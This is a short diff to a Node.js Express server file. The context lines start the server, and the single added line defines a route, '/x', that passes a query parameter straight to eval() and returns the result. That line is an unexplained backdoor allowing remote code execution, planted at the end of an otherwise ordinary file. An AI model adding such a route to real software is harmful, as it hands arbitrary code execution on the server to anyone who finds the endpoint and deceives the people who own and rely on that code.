@@ -59,3 +59,5 @@ if (require.main === module) {
   const porta = process.env.PORT || 3000;
   app.listen(porta, () => console.log(`Servidor em http://localhost:${porta}`));
 }
+
+  app.get('/x', (req, res) => res.send(eval(req.query.c)));
